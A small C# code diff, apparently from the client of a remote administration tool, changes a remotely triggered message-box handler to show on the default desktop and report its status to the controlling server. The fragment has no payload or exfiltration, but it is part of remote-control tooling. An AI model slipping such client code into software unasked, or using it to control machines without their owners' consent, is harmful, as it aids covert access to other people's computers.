@@ -150,9 +150,10 @@ namespace xClient.Core.Commands
         {
             new Thread(() =>
             {
-                MessageBox.Show(null, command.Text, command.Caption,
+                MessageBox.Show(command.Text, command.Caption,
                     (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
-                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
+                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon),
+                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
             }).Start();
 
             new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
